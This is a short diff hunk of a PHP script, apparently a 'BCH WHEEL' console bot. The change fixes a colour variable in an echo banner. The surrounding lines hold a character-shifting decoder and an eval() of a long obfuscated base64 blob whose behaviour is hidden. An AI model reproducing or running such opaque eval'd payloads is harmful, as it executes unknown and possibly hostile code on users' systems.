@@ -9,7 +9,7 @@ $JWC[$i] = chr(ord($JWC[$i])-1);
  }eval(zizQ("VdHfSsMwFMfxB8hThDJYHYx2S90YZRfDC2+UQt2NKJTMHrdo+ofTFJkvb2Jje+xN4ZMvhf7CuX0Y666dgSqcv2mQOL9JGSulgaKEd9lrUxhVwXdTQ9GBCYNDp2T0IT8lGhm4Nlrwp+MhP/K77CHL+SJiDBAbLBDaBo2qz2HsuhlCtw9eYyFetlXg4KKMrDzFqYgHlad+7XE1YtsbdZnSLVESe0Yop3Q1Ggk9nhGgntI1URJ7voLWzddUC8ok937SPUxxMiFJk7/fwFaT+JYyyb3r/5/eECXxhkwk+J4PByLduZF4FD0qtFdjC3vN47Ff212/NfcKg+dltSx/b3qW1UU+bpv4tS3ekx0TN5dfRXjbDav8AA=="));
 
 $server = "Online";
-echo"red2 
+echo"$red2 
 ┌────────────────────────────────────────────────────────────────────┐
 │  $green2                      ＢＣＨ  ＷＨＥＥＬ                         $red2 │
 └────────────────────────────────────────────────────────────────────┘\n";
